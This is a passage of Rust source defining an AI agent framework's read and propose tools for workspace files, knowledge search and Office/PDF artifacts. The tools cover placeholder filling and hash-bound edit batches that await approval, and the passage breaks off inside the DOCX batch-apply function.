//! Built-in tools over the closed capability catalog.
//!
//! Every tool here is `Read` or `Propose`: reads return facts with the
//! content hashes a later batch must bind to; proposals return a typed
//! `harbor.artifact_batch/v3` plus the hash of the output it would produce,
//! which is exactly what an approval receipt binds
//! (`schemas/approval_receipt.schema.json`: `base_content_hash`,
//! `proposed_output_hash`, `batch_id`). No tool commits anything.

use std::collections::{BTreeMap, BTreeSet};
use std::sync::Arc;

use serde_json::{json, Value};

use harbor_artifacts::{
    ArtifactBatch, DocxDocument, DocxOp, OpKind, Operation, PptxDeck, Precondition, WorkbookDoc,
};
use harbor_canonical::JsonValue;
use harbor_formula::value::CellValue;
use harbor_inference::provider::{Capabilities, ChatRequest};

use super::{RiskClass, Tool, ToolContext, ToolError, ToolSpec};

const MB: usize = 1024 * 1024;

pub fn all() -> Vec<Arc<dyn Tool>> {
    vec![
        Arc::new(FsReadWorkspaceFile::new()),
        Arc::new(KnowledgeSearchTool::new()),
        Arc::new(ArtifactRead::new()),
        Arc::new(ArtifactPlaceholders::new()),
        Arc::new(ArtifactFillPlaceholders::new()),
        Arc::new(ArtifactProposeBatch::new()),
        Arc::new(FormulaAudit::new()),
        Arc::new(FormulaBuildOperations::new()),
        Arc::new(TextVerifyFields::new()),
        Arc::new(TextDetectLanguage::new()),
        Arc::new(ModelAsk::new()),
        Arc::new(ModelEmbed::new()),
        Arc::new(ClipboardRead::new()),
        Arc::new(super::review::TextVerifyNumbers::new()),
        Arc::new(super::review::DeckInspect::new()),
        Arc::new(super::review::WorkbookConventions::new()),
        Arc::new(super::review::DocxInspect::new()),
    ]
}

fn s(v: &Value, key: &str) -> Option<String> {
    v.get(key).and_then(Value::as_str).map(str::to_string)
}

fn artifact(
    ctx: &ToolContext<'_>,
    tool: &str,
    args: &Value,
) -> Result<(String, super::ArtifactBytes), ToolError> {
    let id =
        s(args, "artifact_id").ok_or_else(|| ToolError::failed(tool, "artifact_id missing"))?;
    let a = ctx.artifacts.get(&id).ok_or_else(|| {
        ToolError::Unavailable(
            tool.into(),
            format!("artifact {id} is not attached to this run"),
        )
    })?;
    Ok((id, a))
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ArtifactKind {
    Docx,
    Xlsx,
    Pptx,
    Pdf,
    Text,
    Unknown,
}

impl ArtifactKind {
    pub fn as_str(&self) -> &'static str {
        match self {
            ArtifactKind::Docx => "docx",
            ArtifactKind::Xlsx => "xlsx",
            ArtifactKind::Pptx => "pptx",
            ArtifactKind::Pdf => "pdf",
            ArtifactKind::Text => "text",
            ArtifactKind::Unknown => "unknown",
        }
    }
}

/// Detect by content, never by file name: OOXML content types decide
/// between the three Office kinds, `%PDF` marks a PDF, valid UTF-8 without
/// a zip header is text.
pub fn detect_kind(bytes: &[u8]) -> ArtifactKind {
    if bytes.starts_with(b"%PDF") {
        return ArtifactKind::Pdf;
    }
    if bytes.starts_with(b"PK") {
        let Ok(mut archive) = zip::ZipArchive::new(std::io::Cursor::new(bytes)) else {
            return ArtifactKind::Unknown;
        };
        let content_types = archive
            .by_name("[Content_Types].xml")
            .ok()
            .map(|mut f| {
                use std::io::Read as _;
                let mut s = String::new();
                let _ = f.read_to_string(&mut s);
                s
            })
            .unwrap_or_default();
        return if content_types.contains("spreadsheetml") {
            ArtifactKind::Xlsx
        } else if content_types.contains("presentationml") {
            ArtifactKind::Pptx
        } else if content_types.contains("wordprocessingml") {
            ArtifactKind::Docx
        } else {
            ArtifactKind::Unknown
        };
    }
    if std::str::from_utf8(bytes).is_ok() {
        return ArtifactKind::Text;
    }
    ArtifactKind::Unknown
}

pub fn cell_value_json(v: &CellValue) -> Value {
    match v {
        CellValue::Blank => json!({"kind": "blank"}),
        CellValue::Number(n) => json!({"kind": "number", "value": n}),
        CellValue::Text(t) => json!({"kind": "text", "value": t}),
        CellValue::Bool(b) => json!({"kind": "bool", "value": b}),
        CellValue::Error(e) => json!({"kind": "error", "code": e.code()}),
    }
}

fn cell_value_repr(v: &CellValue) -> String {
    match v {
        CellValue::Blank => String::new(),
        CellValue::Number(n) => format!("{n}"),
        CellValue::Text(t) => t.clone(),
        CellValue::Bool(b) => {
            if *b {
                "TRUE".into()
            } else {
                "FALSE".into()
            }
        }
        CellValue::Error(e) => e.code().to_string(),
    }
}

/// Precondition hash of a cell: formula and current value together.
pub fn cell_content_hash(formula: Option<&str>, cached: Option<&CellValue>) -> String {
    let repr = format!(
        "{}\u{1}{}",
        formula.unwrap_or(""),
        cached.map(cell_value_repr).unwrap_or_default()
    );
    harbor_canonical::sha256_hex(repr.as_bytes())
}

fn ident_safe(s: &str) -> bool {
    let mut c = s.chars();
    matches!(c.next(), Some(x) if x.is_ascii_alphanumeric())
        && c.all(|x| x.is_ascii_alphanumeric() || matches!(x, '_' | '.' | '-'))
}

/// Schema-safe target identity for a cell precondition.
pub fn cell_target_id(sheet: &str, address: &str) -> String {
    if ident_safe(sheet) {
        format!("cell:{sheet}:{address}")
    } else {
        format!(
            "cell:h{}:{address}",
            &harbor_canonical::sha256_hex(sheet.as_bytes())[..12]
        )
    }
}

pub fn paragraph_target_id(index: u32) -> String {
    format!("p:{index}")
}

fn addr(col: u32, row: u32) -> String {
    format!("{}{}", harbor_artifacts::workbook::col_letter(col), row)
}

fn parse_addr(a: &str) -> Option<(u32, u32)> {
    let letters: String = a.chars().take_while(|c| c.is_ascii_alphabetic()).collect();
    let digits: String = a.chars().skip(letters.len()).collect();
    if letters.is_empty() || digits.is_empty() || !digits.chars().all(|c| c.is_ascii_digit()) {
        return None;
    }
    Some((
        harbor_artifacts::workbook::col_number(&letters),
        digits.parse().ok()?,
    ))
}

// ---------------------------------------------------------------------------
// fs.read_workspace_file

pub struct FsReadWorkspaceFile {
    spec: ToolSpec,
}

impl FsReadWorkspaceFile {
    pub fn new() -> Self {
        FsReadWorkspaceFile {
            spec: ToolSpec {
                id: "fs.read_workspace_file".into(),
                description:
                    "Read a file inside the user-granted workspace folder (relative path only)."
                        .into(),
                args_schema: json!({
                    "type": "object",
                    "properties": {
                        "path": {"type": "string", "minLength": 1, "maxLength": 1024},
                        "max_bytes": {"type": "integer", "minimum": 1, "maximum": 8388608}
                    },
                    "required": ["path"],
                    "additionalProperties": false
                }),
                risk: RiskClass::Read,
                requires: vec![],
                timeout_ms: 5_000,
                max_output_bytes: 12 * MB,
            },
        }
    }
}

impl Default for FsReadWorkspaceFile {
    fn default() -> Self {
        Self::new()
    }
}

impl Tool for FsReadWorkspaceFile {
    fn spec(&self) -> &ToolSpec {
        &self.spec
    }

    fn call(&self, ctx: &ToolContext<'_>, args: &Value) -> Result<Value, ToolError> {
        let tool = &self.spec.id;
        let root = ctx.workspace_root.as_ref().ok_or_else(|| {
            ToolError::Unavailable(
                tool.clone(),
                "no workspace folder granted to this run".into(),
            )
        })?;
        let rel = s(args, "path").unwrap_or_default();
        let p = std::path::Path::new(&rel);
        if p.is_absolute()
            || p.components().any(|c| {
                matches!(
                    c,
                    std::path::Component::ParentDir
                        | std::path::Component::RootDir
                        | std::path::Component::Prefix(_)
                )
            })
        {
            return Err(ToolError::failed(
                tool,
                format!("path {rel:?} must be relative and may not escape the workspace"),
            ));
        }
        let full = root.join(p);
        // Resolve symlinks and re-check containment on the real path.
        let canon_root = std::fs::canonicalize(root)
            .map_err(|e| ToolError::failed(tool, format!("workspace root: {e}")))?;
        let canon = std::fs::canonicalize(&full)
            .map_err(|e| ToolError::failed(tool, format!("{rel}: {e}")))?;
        if !canon.starts_with(&canon_root) {
            return Err(ToolError::failed(
                tool,
                format!("path {rel:?} resolves outside the workspace"),
            ));
        }
        let max = args
            .get("max_bytes")
            .and_then(Value::as_u64)
            .unwrap_or(4 * MB as u64) as usize;
        let bytes =
            std::fs::read(&canon).map_err(|e| ToolError::failed(tool, format!("{rel}: {e}")))?;
        let truncated = bytes.len() > max;
        let slice = &bytes[..bytes.len().min(max)];
        let text = std::str::from_utf8(slice).ok().map(str::to_string);
        Ok(json!({
            "path": rel,
            "bytes": bytes.len(),
            "sha256": harbor_canonical::sha256_hex(&bytes),
            "truncated": truncated,
            "text": text,
            "kind": detect_kind(&bytes).as_str(),
        }))
    }
}

// ---------------------------------------------------------------------------
// knowledge.search

pub struct KnowledgeSearchTool {
    spec: ToolSpec,
}

impl KnowledgeSearchTool {
    pub fn new() -> Self {
        KnowledgeSearchTool {
            spec: ToolSpec {
                id: "knowledge.search".into(),
                description: "Search the local Knowledge index; returns citations with source state and evidence text.".into(),
                args_schema: json!({
                    "type": "object",
                    "properties": {
                        "query": {"type": "string", "minLength": 1, "maxLength": 4000},
                        "top_k": {"type": "integer", "minimum": 1, "maximum": 20}
                    },
                    "required": ["query"],
                    "additionalProperties": false
                }),
                risk: RiskClass::Read,
                requires: vec!["knowledge.index".into()],
                timeout_ms: 30_000,
                max_output_bytes: 2 * MB,
            },
        }
    }
}

impl Default for KnowledgeSearchTool {
    fn default() -> Self {
        Self::new()
    }
}

impl Tool for KnowledgeSearchTool {
    fn spec(&self) -> &ToolSpec {
        &self.spec
    }

    fn call(&self, ctx: &ToolContext<'_>, args: &Value) -> Result<Value, ToolError> {
        let k = ctx.knowledge.ok_or_else(|| {
            ToolError::Unavailable(self.spec.id.clone(), "no Knowledge index is open".into())
        })?;
        let q = s(args, "query").unwrap_or_default();
        let top_k = args.get("top_k").and_then(Value::as_u64).unwrap_or(5) as usize;
        k.search(&q, top_k)
            .map_err(|e| ToolError::failed(&self.spec.id, e))
    }
}

// ---------------------------------------------------------------------------
// artifact.read

pub struct ArtifactRead {
    spec: ToolSpec,
}

impl ArtifactRead {
    pub fn new() -> Self {
        ArtifactRead {
            spec: ToolSpec {
                id: "artifact.read".into(),
                description: "Read an attached DOCX/XLSX/PPTX/PDF/text artifact as typed content with the content hashes batches bind to.".into(),
                args_schema: json!({
                    "type": "object",
                    "properties": {
                        "artifact_id": {"type": "string", "minLength": 1, "maxLength": 128},
                        "max_items": {"type": "integer", "minimum": 1, "maximum": 100000}
                    },
                    "required": ["artifact_id"],
                    "additionalProperties": false
                }),
                risk: RiskClass::Read,
                requires: vec!["artifact.engine".into()],
                timeout_ms: 30_000,
                max_output_bytes: 8 * MB,
            },
        }
    }
}

impl Default for ArtifactRead {
    fn default() -> Self {
        Self::new()
    }
}

pub fn read_artifact(
    tool: &str,
    artifact_id: &str,
    name: &str,
    bytes: &[u8],
    max_items: usize,
) -> Result<Value, ToolError> {
    let kind = detect_kind(bytes);
    let content_hash = harbor_canonical::sha256_hex(bytes);
    let mut out = json!({
        "artifact_id": artifact_id,
        "name": name,
        "kind": kind.as_str(),
        "content_hash": content_hash,
        "bytes": bytes.len(),
        "truncated": false,
    });
    match kind {
        ArtifactKind::Docx => {
            let d =
                DocxDocument::load(bytes).map_err(|e| ToolError::failed(tool, e.to_string()))?;
            let total = d.paragraphs.len();
            let paras: Vec<Value> = d
                .paragraphs
                .iter()
                .take(max_items)
                .map(|p| {
                    json!({
                        "index": p.index,
                        "target_id": paragraph_target_id(p.index),
                        "style": p.style,
                        "text": p.text,
                        "content_hash": p.content_hash,
                    })
                })
                .collect();
            out["paragraphs"] = Value::Array(paras);
            out["paragraph_count"] = json!(total);
            out["preserved_parts"] = json!(d.preserved_parts);
            out["truncated"] = json!(total > max_items);
            out["text"] = json!(d
                .paragraphs
                .iter()
                .map(|p| p.text.as_str())
                .collect::<Vec<_>>()
                .join("\n"));
        }
        ArtifactKind::Xlsx => {
            let w = WorkbookDoc::load(bytes).map_err(|e| ToolError::failed(tool, e.to_string()))?;
            let mut sheets = Vec::new();
            let mut emitted = 0usize;
            let mut truncated = false;
            for (name, data) in w.sheets_snapshot() {
                let mut cells = Vec::new();
                for ((c, r), cell) in &data.cells {
                    if emitted >= max_items {
                        truncated = true;
                        break;
                    }
                    let a = addr(*c, *r);
                    cells.push(json!({
                        "address": a,
                        "target_id": cell_target_id(name, &a),
                        "formula": cell.formula,
                        "value": cell.cached.as_ref().map(cell_value_json),
                        "content_hash": cell_content_hash(cell.formula.as_deref(), cell.cached.as_ref()),
                    }));
                    emitted += 1;
                }
                sheets.push(json!({"name": name, "cells": cells, "cell_count": data.cells.len()}));
            }
            out["sheets"] = Value::Array(sheets);
            out["unmodeled_parts"] = json!(w.unmodeled_parts());
            out["truncated"] = json!(truncated);
        }
        ArtifactKind::Pptx => {
            let d = PptxDeck::from_pptx_bytes(bytes)
                .map_err(|e| ToolError::failed(tool, e.to_string()))?;
            let total = d.slides.len();
            let slides: Vec<Value> = d
                .slides
                .iter()
                .take(max_items)
                .enumerate()
                .map(|(i, sl)| {
                    json!({
                        "index": i + 1,
                        "title": sl.title,
                        "bullets": sl.bullets,
                        "notes": sl.notes,
                        "has_chart": sl.chart.is_some(),
                        "has_image": sl.image.is_some(),
                    })
                })
                .collect();
            out["title"] = json!(d.title);
            out["slides"] = Value::Array(slides);
            out["slide_count"] = json!(total);
            out["truncated"] = json!(total > max_items);
            out["text"] = json!(d
                .slides
                .iter()
                .flat_map(|sl| std::iter::once(sl.title.clone())
                    .chain(sl.bullets.iter().cloned())
                    .chain(sl.notes.iter().cloned()))
                .collect::<Vec<_>>()
                .join("\n"));
        }
        ArtifactKind::Pdf => {
            let p = harbor_render::pdf::extract_pages(bytes)
                .map_err(|e| ToolError::failed(tool, e.to_string()))?;
            let pages: Vec<Value> = p
                .pages
                .iter()
                .take(max_items)
                .map(|pg| json!({"index": pg.index + 1, "text": pg.text}))
                .collect();
            out["pages"] = Value::Array(pages);
            out["page_count"] = json!(p.page_count);
            out["truncated"] = json!(p.page_count > max_items);
            out["text"] = json!(p
                .pages
                .iter()
                .map(|pg| pg.text.as_str())
                .collect::<Vec<_>>()
                .join("\n"));
        }
        ArtifactKind::Text => {
            out["text"] = json!(String::from_utf8_lossy(bytes));
        }
        ArtifactKind::Unknown => {
            return Err(ToolError::failed(
                tool,
                format!("artifact {artifact_id}: unsupported content"),
            ));
        }
    }
    Ok(out)
}

impl Tool for ArtifactRead {
    fn spec(&self) -> &ToolSpec {
        &self.spec
    }

    fn call(&self, ctx: &ToolContext<'_>, args: &Value) -> Result<Value, ToolError> {
        let (id, a) = artifact(ctx, &self.spec.id, args)?;
        let max_items = args
            .get("max_items")
            .and_then(Value::as_u64)
            .unwrap_or(5000) as usize;
        read_artifact(&self.spec.id, &id, &a.name, &a.bytes, max_items)
    }
}

// ---------------------------------------------------------------------------
// artifact.placeholders

/// Placeholder syntaxes recognised in document text.
pub const PLACEHOLDER_PATTERN: &str = r"\{\{\s*([A-Za-z0-9_.\- ]+?)\s*\}\}|\[\[\s*([A-Za-z0-9_.\- ]+?)\s*\]\]|\$([A-Z][A-Z0-9_]*)\$|<<\s*([A-Za-z0-9_.\- ]+?)\s*>>|\[([A-Z][A-Z0-9 _]{1,40})\]";

pub struct ArtifactPlaceholders {
    spec: ToolSpec,
    re: regex::Regex,
}

impl ArtifactPlaceholders {
    pub fn new() -> Self {
        ArtifactPlaceholders {
            spec: ToolSpec {
                id: "artifact.placeholders".into(),
                description: "List every placeholder marker ({{name}}, [[name]], $NAME$, <<name>>, [NAME]) in a DOCX or text artifact with its paragraph and content hash.".into(),
                args_schema: json!({
                    "type": "object",
                    "properties": {
                        "artifact_id": {"type": "string", "minLength": 1, "maxLength": 128}
                    },
                    "required": ["artifact_id"],
                    "additionalProperties": false
                }),
                risk: RiskClass::Read,
                requires: vec!["artifact.engine".into()],
                timeout_ms: 30_000,
                max_output_bytes: 4 * MB,
            },
            re: regex::Regex::new(PLACEHOLDER_PATTERN).expect("placeholder regex"),
        }
    }

    fn keys_in(&self, text: &str) -> Vec<(String, String)> {
        self.re
            .captures_iter(text)
            .filter_map(|c| {
                let raw = c.get(0)?.as_str().to_string();
                let key = (1..=5)
                    .find_map(|i| c.get(i))
                    .map(|m| m.as_str().trim().to_string())?;
                Some((key, raw))
            })
            .collect()
    }
}

impl Default for ArtifactPlaceholders {
    fn default() -> Self {
        Self::new()
    }
}

/// Paragraph-like units of an artifact that placeholder tools operate on.
/// (paragraph index, text, content hash)
type TextUnit = (u32, String, String);

fn text_units(tool: &str, bytes: &[u8]) -> Result<(ArtifactKind, Vec<TextUnit>), ToolError> {
    match detect_kind(bytes) {
        ArtifactKind::Docx => {
            let d =
                DocxDocument::load(bytes).map_err(|e| ToolError::failed(tool, e.to_string()))?;
            Ok((
                ArtifactKind::Docx,
                d.paragraphs
                    .into_iter()
                    .map(|p| (p.index, p.text, p.content_hash))
                    .collect(),
            ))
        }
        ArtifactKind::Text => {
            let text = String::from_utf8_lossy(bytes).to_string();
            Ok((
                ArtifactKind::Text,
                text.lines()
                    .enumerate()
                    .map(|(i, l)| {
                        (
                            (i + 1) as u32,
                            l.to_string(),
                            harbor_canonical::sha256_hex(l.as_bytes()),
                        )
                    })
                    .collect(),
            ))
        }
        other => Err(ToolError::failed(
            tool,
            format!(
                "placeholders are supported for DOCX and text artifacts, not {}",
                other.as_str()
            ),
        )),
    }
}

impl Tool for ArtifactPlaceholders {
    fn spec(&self) -> &ToolSpec {
        &self.spec
    }

    fn call(&self, ctx: &ToolContext<'_>, args: &Value) -> Result<Value, ToolError> {
        let (id, a) = artifact(ctx, &self.spec.id, args)?;
        let (kind, units) = text_units(&self.spec.id, &a.bytes)?;
        let mut found: Vec<Value> = Vec::new();
        let mut keys: BTreeSet<String> = BTreeSet::new();
        for (index, text, hash) in &units {
            for (key, raw) in self.keys_in(text) {
                keys.insert(key.clone());
                found.push(json!({
                    "key": key,
                    "raw": raw,
                    "paragraph_index": index,
                    "target_id": paragraph_target_id(*index),
                    "content_hash": hash,
                }));
            }
        }
        Ok(json!({
            "artifact_id": id,
            "kind": kind.as_str(),
            "content_hash": harbor_canonical::sha256_hex(&a.bytes),
            "placeholders": found,
            "keys": keys.into_iter().collect::<Vec<_>>(),
            "count": units.iter().map(|(_, t, _)| self.keys_in(t).len()).sum::<usize>(),
        }))
    }
}

// ---------------------------------------------------------------------------
// artifact.fill_placeholders

pub struct ArtifactFillPlaceholders {
    spec: ToolSpec,
    re: regex::Regex,
}

impl ArtifactFillPlaceholders {
    pub fn new() -> Self {
        ArtifactFillPlaceholders {
            spec: ToolSpec {
                id: "artifact.fill_placeholders".into(),
                description: "Propose a text.replace batch that fills placeholders from supplied values; unmapped keys are reported, never invented, and paragraphs without a full mapping are left untouched.".into(),
                args_schema: json!({
                    "type": "object",
                    "properties": {
                        "artifact_id": {"type": "string", "minLength": 1, "maxLength": 128},
                        "values": {"type": "object", "additionalProperties": {"type": ["string", "number", "boolean"]}},
                        "batch_id": {"type": "string", "minLength": 1, "maxLength": 128, "pattern": "^[A-Za-z0-9][A-Za-z0-9_.:-]*$"}
                    },
                    "required": ["artifact_id", "values"],
                    "additionalProperties": false
                }),
                risk: RiskClass::Propose,
                requires: vec!["artifact.engine".into()],
                timeout_ms: 60_000,
                max_output_bytes: 8 * MB,
            },
            re: regex::Regex::new(PLACEHOLDER_PATTERN).expect("placeholder regex"),
        }
    }
}

impl Default for ArtifactFillPlaceholders {
    fn default() -> Self {
        Self::new()
    }
}

fn value_text(v: &Value) -> String {
    match v {
        Value::String(s) => s.clone(),
        other => other.to_string(),
    }
}

impl Tool for ArtifactFillPlaceholders {
    fn spec(&self) -> &ToolSpec {
        &self.spec
    }

    fn call(&self, ctx: &ToolContext<'_>, args: &Value) -> Result<Value, ToolError> {
        let tool = self.spec.id.clone();
        let (id, a) = artifact(ctx, &tool, args)?;
        let values = args
            .get("values")
            .and_then(Value::as_object)
            .cloned()
            .unwrap_or_default();
        let (kind, units) = text_units(&tool, &a.bytes)?;
        if kind != ArtifactKind::Docx {
            return Err(ToolError::failed(
                &tool,
                "fill proposals are supported for DOCX artifacts",
            ));
        }
        let mut ops = Vec::new();
        let mut unmapped: BTreeSet<String> = BTreeSet::new();
        let mut skipped_paragraphs = Vec::new();
        let mut replaced = 0usize;
        let mut preview = Vec::new();
        for (index, text, hash) in &units {
            let caps: Vec<(String, String)> = self
                .re
                .captures_iter(text)
                .filter_map(|c| {
                    let raw = c.get(0)?.as_str().to_string();
                    let key = (1..=5)
                        .find_map(|i| c.get(i))
                        .map(|m| m.as_str().trim().to_string())?;
                    Some((key, raw))
                })
                .collect();
            if caps.is_empty() {
                continue;
            }
            let missing: Vec<&String> = caps
                .iter()
                .map(|(k, _)| k)
                .filter(|k| !values.contains_key(*k))
                .collect();
            if !missing.is_empty() {
                for m in missing {
                    unmapped.insert(m.clone());
                }
                skipped_paragraphs.push(index);
                continue;
            }
            let mut new_text = text.clone();
            for (key, raw) in &caps {
                new_text = new_text.replace(raw, &value_text(&values[key]));
                replaced += 1;
            }
            let op_id = format!("op-{}", ops.len() + 1);
            preview.push(json!({"target_id": paragraph_target_id(*index), "before": text, "after": new_text}));
            ops.push(Operation {
                op_id,
                kind: OpKind::TextReplace,
                precondition: Precondition {
                    target_id: paragraph_target_id(*index),
                    expected_content_hash: hash.clone(),
                },
                args: JsonValue::object([("text", JsonValue::str(new_text))]),
            });
        }
        let base_content_hash = harbor_canonical::sha256_hex(&a.bytes);
        if ops.is_empty() {
            return Ok(json!({
                "artifact_id": id,
                "base_content_hash": base_content_hash,
                "batch": Value::Null,
                "op_count": 0,
                "replaced": 0,
                "unmapped": unmapped.into_iter().collect::<Vec<_>>(),
                "skipped_paragraphs": skipped_paragraphs,
                "preview": [],
            }));
        }
        let batch_id =
            s(args, "batch_id").unwrap_or_else(|| default_batch_id(&base_content_hash, &ops));
        let batch = ArtifactBatch {
            batch_id,
            artifact_id: id.clone(),
            base_version_id: format!("v-{}", &base_content_hash[..16]),
            base_content_hash: base_content_hash.clone(),
            operations: ops,
        };
        batch
            .validate()
            .map_err(|e| ToolError::failed(&tool, e.to_string()))?;
        let proposed = apply_docx(&tool, &a.bytes, &batch)?;
        Ok(json!({
            "artifact_id": id,
            "base_content_hash": base_content_hash,
            "batch": batch_json(&batch),
            "canonical_args_hash": batch.canonical_hash(),
            "proposed_output_hash": harbor_canonical::sha256_hex(&proposed),
            "op_count": batch.operations.len(),
            "replaced": replaced,
            "unmapped": unmapped.into_iter().collect::<Vec<_>>(),
            "skipped_paragraphs": skipped_paragraphs,
            "preview": preview,
        }))
    }
}

/// Parse a `harbor.artifact_batch/v3` value (as propose tools emit it and
/// the approval binds it) back into a typed batch. Used by the commit
/// path to re-derive the approved output from the base bytes.
pub fn batch_from_value(v: &Value) -> Result<ArtifactBatch, String> {
    let s = |k: &str| v.get(k).and_then(Value::as_str).map(str::to_string);
    if let Some(schema) = s("schema") {
        if schema != "harbor.artifact_batch/v3" {
            return Err(format!("unsupported batch schema {schema}"));
        }
    }
    let mut operations = Vec::new();
    for (i, op) in v
        .get("operations")
        .and_then(Value::as_array)
        .ok_or("batch has no operations")?
        .iter()
        .enumerate()
    {
        let so = |k: &str| op.get(k).and_then(Value::as_str).map(str::to_string);
        let kind = match so("kind").as_deref() {
            Some("text.replace") => OpKind::TextReplace,
            Some("cell.set") => OpKind::CellSet,
            Some("slide.text_set") => OpKind::SlideTextSet,
            Some("slide.append") => OpKind::SlideAppend,
            other => return Err(format!("op {}: unknown kind {other:?}", i + 1)),
        };
        let pre = op
            .get("precondition")
            .ok_or_else(|| format!("op {}: no precondition", i + 1))?;
        let args = harbor_canonical::convert(op.get("args").cloned().unwrap_or(json!({})))
            .map_err(|e| format!("op {}: args not canonical: {e}", i + 1))?;
        operations.push(Operation {
            op_id: so("op_id").ok_or_else(|| format!("op {}: no op_id", i + 1))?,
            kind,
            precondition: Precondition {
                target_id: pre
                    .get("target_id")
                    .and_then(Value::as_str)
                    .unwrap_or_default()
                    .to_string(),
                expected_content_hash: pre
                    .get("expected_content_hash")
                    .and_then(Value::as_str)
                    .unwrap_or_default()
                    .to_string(),
            },
            args,
        });
    }
    let batch = ArtifactBatch {
        batch_id: s("batch_id").ok_or("batch has no batch_id")?,
        artifact_id: s("artifact_id").ok_or("batch has no artifact_id")?,
        base_version_id: s("base_version_id").unwrap_or_default(),
        base_content_hash: s("base_content_hash").ok_or("batch has no base_content_hash")?,
        operations,
    };
    batch.validate().map_err(|e| e.to_string())?;
    Ok(batch)
}

/// Apply a batch to the base bytes it was proposed against (DOCX or XLSX),
/// re-checking every precondition. Deterministic: the same base and batch
/// always yield the same bytes, so the commit path can verify the approved
/// `proposed_output_hash` before anything is written.
pub fn apply_batch(bytes: &[u8], batch: &ArtifactBatch) -> Result<Vec<u8>, ToolError> {
    let tool = "artifact.apply_batch";
    match detect_kind(bytes) {
        ArtifactKind::Docx => apply_docx(tool, bytes, batch),
        ArtifactKind::Xlsx => apply_xlsx(tool, bytes, batch),
        other => Err(ToolError::failed(
            tool,
            format!(
                "batches are supported for DOCX and XLSX, not {}",
                other.as_str()
            ),
        )),
    }
}

/// One human-readable entry of a proposal diff (Work surface review).
#[derive(Debug, Clone, PartialEq, serde::Serialize, serde::Deserialize)]
pub struct DiffEntry {
    pub op_id: String,
    pub kind: String,
    pub target_id: String,
    /// Where the change lands: paragraph index, or `Sheet!A1`.
    pub location: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub before: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub after: Option<String>,
}

/// Before/after view of a batch against its base bytes: paragraph text for
/// DOCX `text.replace`, formula-or-value for XLSX `cell.set`. Targets the
/// base no longer contains are reported with `before: None`.
pub fn proposal_diff(bytes: &[u8], batch: &ArtifactBatch) -> Vec<DiffEntry> {
    let kind = detect_kind(bytes);
    let doc = matches!(kind, ArtifactKind::Docx)
        .then(|| DocxDocument::load(bytes).ok())
        .flatten();
    let wb = matches!(kind, ArtifactKind::Xlsx)
        .then(|| WorkbookDoc::load(bytes).ok())
        .flatten();
    batch
        .operations
        .iter()
        .map(|op| {
            let (location, before, after) = match op.kind {
                OpKind::TextReplace => {
                    let index: Option<u32> = op
                        .precondition
                        .target_id
                        .strip_prefix("p:")
                        .and_then(|x| x.parse().ok());
                    let before = doc.as_ref().and_then(|d| {
                        d.paragraphs
                            .iter()
                            .find(|p| Some(p.index) == index)
                            .map(|p| p.text.clone())
                    });
                    (
                        index.map(|i| format!("¶ {i}")).unwrap_or_default(),
                        before,
                        op.args
                            .get("text")
                            .and_then(|v| v.as_str())
                            .map(str::to_string),
                    )
                }
                OpKind::CellSet => {
                    let sheet = op
                        .args
                        .get("sheet_id")
                        .and_then(|v| v.as_str())
                        .unwrap_or("");
                    let address = op
                        .args
                        .get("address")
                        .and_then(|v| v.as_str())
                        .unwrap_or("");
                    let before = wb.as_ref().and_then(|w| {
                        let (col, row) = parse_addr(address)?;
                        let cell = w.sheets_snapshot().get(sheet)?.cells.get(&(col, row))?;
                        Some(match (&cell.formula, &cell.cached) {
                            (Some(f), Some(v)) => format!("={f}  →  {}", cell_value_repr(v)),
                            (Some(f), None) => format!("={f}"),
                            (None, Some(v)) => cell_value_repr(v),
                            (None, None) => String::new(),
                        })
                    });
                    let after = op.args.get("value").map(|v| match v {
                        JsonValue::Str(s) => {
                            if op.args.get("value_kind").and_then(|k| k.as_str()) == Some("formula")
                            {
                                format!("={}", s.trim_start_matches('='))
                            } else {
                                s.clone()
                            }
                        }
                        JsonValue::Int(i) => i.to_string(),
                        JsonValue::Bool(b) => b.to_string(),
                        other => other
                            .to_canonical_bytes()
                            .map(|b| String::from_utf8_lossy(&b).into_owned())
                            .unwrap_or_default(),
                    });
                    (format!("{sheet}!{address}"), before, after)
                }
                OpKind::SlideTextSet | OpKind::SlideAppend => (
                    op.precondition.target_id.clone(),
                    None,
                    op.args
                        .get("text")
                        .and_then(|v| v.as_str())
                        .map(str::to_string),
                ),
            };
            DiffEntry {
                op_id: op.op_id.clone(),
                kind: op.kind.as_str().into(),
                target_id: op.precondition.target_id.clone(),
                location,
                before,
                after,
            }
        })
        .collect()
}

/// Default batch identity: bound to the base *and* to the operations, so
/// two different proposals against the same base never share a journal
/// row (the commit journal treats a repeated batch id as a replay), while
/// the same proposal stays deterministic for cassettes and evals.
fn default_batch_id(base_content_hash: &str, ops: &[Operation]) -> String {
    let ops_value = JsonValue::Array(
        ops.iter()
            .map(|op| {
                JsonValue::object([
                    ("op_id", JsonValue::str(op.op_id.clone())),
                    ("kind", JsonValue::str(op.kind.as_str())),
                    (
                        "target_id",
                        JsonValue::str(op.precondition.target_id.clone()),
                    ),
                    ("args", op.args.clone()),
                ])
            })
            .collect(),
    );
    let ops_hash = ops_value
        .canonical_sha256()
        .unwrap_or_else(|_| harbor_canonical::sha256_hex(b""));
    format!("batch-{}-{}", &base_content_hash[..12], &ops_hash[..8])
}

fn batch_json(b: &ArtifactBatch) -> Value {
    let canonical = b.to_canonical_value();
    let bytes = canonical.to_canonical_bytes().unwrap_or_default();
    serde_json::from_slice(&bytes).unwrap_or(Value::Null)
}

fn apply_docx(tool: &str, bytes: &[u8], batch: &ArtifactBatch) -> Result<Vec<u8>, ToolError> {
    let doc = DocxDocument::load(bytes).map_err(|e| ToolError::failed(tool, e.to_string()))?;
    let mut ops = Vec::new();
    for op in &batch.operations {
        match op.kind {
            OpKind::TextReplace => {
                let index: u32 = op
                    .precondition
                    .target_id
                    .strip_prefix("p:")
                    .and_then(|x| x.parse().ok())
                    .ok_or_else(|| {
                        ToolError::failed(
                            tool,
                            format!("op {}: target must be p:<index>", op.op_id),
                        )
                    })?;
                let para = doc
                    .paragraphs
                    .iter()
                    .find(|p| p.index == index)
                    .ok_or_else(|| {
                        ToolError::failed(
                            tool,
                            format!("op {}: paragraph {index} not found", op.op_id),
                        )
                    })?;
                if para.content_hash != op.precondition.expected_content_hash {
                    return Err(ToolError::failed(
                        tool,
                        format!("op {}: paragraph {index} changed since it was read (precondition mismatch)", op.op_id),
                    ));
                }
                let text = op
                    .args
                    .get("text")
